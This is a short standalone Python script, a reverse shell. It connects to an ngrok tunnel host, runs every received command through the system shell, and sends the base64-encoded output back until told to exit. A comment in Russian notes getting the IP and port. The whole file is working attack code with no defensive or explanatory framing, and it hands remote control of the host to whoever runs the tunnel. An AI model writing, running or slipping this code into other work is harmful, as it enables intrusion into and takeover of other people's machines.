def connect_and_execute(ip, port):
    import socket, base64, subprocess
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(b"[+] Connection established!\\n")
    while True:
        command = s.recv(1024)
        if command.decode().strip().lower() == "exit":
            break
        result = subprocess.run(command.decode(), shell=True, capture_output=True)
        s.send(base64.b64encode(result.stdout + result.stderr) + b"\\n")
    s.close()

# Получаем IP и порт
connect_and_execute("2.tcp.eu.ngrok.io", 12190)